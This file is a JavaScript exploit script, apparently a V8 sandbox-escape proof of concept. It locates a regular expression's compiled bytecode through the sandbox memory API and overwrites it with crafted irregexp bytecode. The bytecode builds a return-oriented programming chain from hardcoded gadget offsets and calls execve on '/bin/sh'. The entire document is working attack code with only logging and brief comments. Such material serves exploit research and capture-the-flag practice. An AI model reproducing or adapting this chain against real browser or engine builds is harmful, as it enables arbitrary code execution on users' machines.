const RELEASE = true;

// convert int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}

// get (compressed) address of |obj|
function addrof(obj) {
    return Sandbox.getAddressOf(obj);
}

// read 4-byte value from |addr| in sandbox
function read4(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 4));
    return memory_view.getUint32(0, true);
}

// write 4-byte |value| to |addr| in sandbox
function write4(addr, value) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 4));
    memory_view.setUint32(0, value, true);
}


let re = /.*/;

let re_addr = addrof(re);
console.log(`[+] re_addr == ${hex(re_addr)}`);

let data_addr = read4(re_addr + 0xc) - 1;
console.log(`[+] data_addr == ${hex(data_addr)}`);

// generate bytecode
console.log("[+] Generating bytecode...");
re.exec();

let bytecode_addr = read4(data_addr + 0x1c) - 1;
console.log(`[+] bytecode_addr == ${hex(bytecode_addr)}`);


// bytecodes
const PUSH_REGISTER = 3;
const SET_REGISTER = 8;
const ADVANCE_REGISTER = 9;
const POP_REGISTER = 12;
const SUCCEED = 14;

let bytecode_arr = [];

function push(idx) {
    bytecode_arr.push(idx << 8 | PUSH_REGISTER);
}

function set(idx, value) {
    bytecode_arr.push(idx << 8 | SET_REGISTER);
    bytecode_arr.push(value);
}

function add(idx, value) {
    bytecode_arr.push(idx << 8 | ADVANCE_REGISTER);
    bytecode_arr.push(value);
}

function pop(idx) {
    bytecode_arr.push(idx << 8 | POP_REGISTER);
}

function succeed() {
    bytecode_arr.push(SUCCEED);
}

function mov(to_idx, from_idx) {
    push(from_idx);
    pop(to_idx);
}

// shell command to execute
let cmd = "/bin/sh\x00";

// register index of return address
let idx = RELEASE ? 82 : 72;

// get binary base
mov(0, idx);
mov(1, idx + 1);
add(0, RELEASE ? -0xa2cf40 : -0x738ee57);

// get stack address (address of registers)
mov(2, idx - 2);
mov(3, idx - 1);
add(2, RELEASE ? -0x200 : -0x248);

// write command to stack
while (cmd.length % 4 != 0) { cmd += "\x00" }
for (let i = 0; i < cmd.length / 4; i++) {
    set(4 + i, 0);
    for (let j = 0; j < 4; j++) { add(4 + i, cmd.charCodeAt(i * 4 + j) << j * 8); }
}

// pop rdi; ret
mov(idx, 0);
mov(idx + 1, 1);
add(idx, RELEASE ? 0xa5350d : 0x639d25d);

// rdi == command
mov(idx + 2, 2);
mov(idx + 3, 3);
add(idx + 2, 0x10);

// pop rsi; ret
mov(idx + 4, 0);
mov(idx + 5, 1);
add(idx + 4, RELEASE ? 0x927f1e : 0xac2f97e);

// rsi == 0
set(idx + 6, 0);
set(idx + 7, 0);

// pop rdx; ret
mov(idx + 8, 0);
mov(idx + 9, 1);
add(idx + 8, RELEASE ? 0x125fc12 : 0x7c37702);

// rdx == 0
set(idx + 10, 0);
set(idx + 11, 0);

// pop rax; ret
mov(idx + 12, 0);
mov(idx + 13, 1);
add(idx + 12, RELEASE ? 0x583eb4 : 0x729ed74);

// rax == 0x3b (execve)
set(idx + 14, 0x3b);
set(idx + 15, 0);

// syscall => execve(command, 0, 0)
mov(idx + 16, 0);
mov(idx + 17, 1);
add(idx + 16, RELEASE ? 0x879cfd : 0x85716fc);

// end
succeed();

// overwrite bytecode
console.log("[+] Overwriting bytecode...");
for (let i = 0; i < bytecode_arr.length; i++) {
    write4(bytecode_addr + 8 + i * 4, bytecode_arr[i]);
}

write4(data_addr + 0x30, 0x2); // set tier-up ticks to 1 => prevent tier-up on next execution

// execute bytecode
console.log("[+] Executing bytecode...");
re.exec("");
